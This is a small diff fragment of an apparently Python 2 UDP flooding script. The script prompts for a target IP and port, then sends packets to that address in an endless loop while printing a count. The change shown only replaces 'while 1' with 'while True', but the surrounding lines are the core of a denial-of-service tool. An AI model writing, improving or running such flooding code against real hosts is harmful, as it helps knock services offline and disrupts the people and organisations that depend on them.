@@ -7,7 +7,7 @@ ip = raw_input('Target IP: ')
 port = input('Port: ')
 sent = 0
 
-while 1:
+while True:
   sock.sendto(bytes,(ip,port))
   print "Sent %s packets to %s at port %s " % (sent,ip,port)
   sent = sent + 1
